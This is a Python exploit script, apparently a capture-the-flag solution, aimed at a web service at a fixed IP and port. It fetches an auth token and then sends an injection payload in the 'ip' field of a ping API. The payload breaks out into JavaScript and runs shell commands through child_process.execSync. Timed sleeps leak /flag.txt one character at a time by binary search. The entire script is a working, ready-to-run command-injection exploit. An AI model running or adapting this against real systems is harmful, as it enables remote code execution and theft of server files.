import time
import requests
import json

DELAY = 2
server = "83.136.254.158"
port = 38205

url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
ping_endpoint = f"{url}/api/service/ping"

def get_token():
    headers = {"Content-Type": "application/json"}
    data = {
        "uid": "user123",
        "sid": "user123abcdefghij3f7"
    }
    response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
    return response.json()['token']

def oracle(pos, mid, token):
    start = time.time()
    payload = {
        "external": "true", 
        "ip": f"{{}}');uip='1.1.1.1';console.log(child_process.execSync('c=$(cut -c {pos} /flag.txt); c_val=$(printf \"%d\" \"$(echo -n $c | od -An -tuC)\"); if [ $c_val -le {mid} ]; then sleep {DELAY}; fi;'))//"
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    response = requests.post(ping_endpoint, headers=headers, data=json.dumps(payload))
    return time.time() - start > DELAY

def binary_search_char(pos, token):
    low, high = 0, 127
    while low < high:
        mid = (low + high) // 2
        # print(f"low: {low}\t\tmid: {mid}\t\thigh: {high}")
        if oracle(pos, mid, token):
            high = mid
        else:
            low = mid + 1
        if low == mid == 0:
            return None
    return chr(low)

def find_chars(token):
    pos = 1
    found_chars = []
    while True:
        char_found = binary_search_char(pos, token)
        if char_found:
            found_chars.append(char_found)
            print(char_found, end='', flush=True)
            pos += 1
        else:
            print("\nNo new character found. Stopping execution.", flush=True)
            break
    return found_chars

# Example usage
token = get_token()
print("[*] The flag is: ", end='', flush=True)
found_chars = find_chars(token)
print()
